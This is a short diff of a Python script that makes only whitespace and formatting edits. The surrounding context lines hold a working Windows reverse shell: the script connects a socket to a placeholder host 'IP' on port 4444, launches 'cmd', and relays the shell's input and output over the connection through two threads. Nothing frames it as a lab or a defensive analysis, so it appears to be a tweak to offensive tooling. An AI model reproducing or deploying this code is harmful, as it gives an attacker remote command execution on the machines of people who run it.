@@ -3,7 +3,6 @@ import socket
 import subprocess
 import threading
 
-
 def s2p(s, p):
     
     while True:
@@ -21,7 +20,7 @@ def p2s(s, p):
         
         s.send(p.stdout.read(1))
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("IP",4444))
 
 p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
@@ -35,7 +34,6 @@ p2s_thread.daemon = True
 p2s_thread.start()
 
 try:
-
     
     p.wait()
 
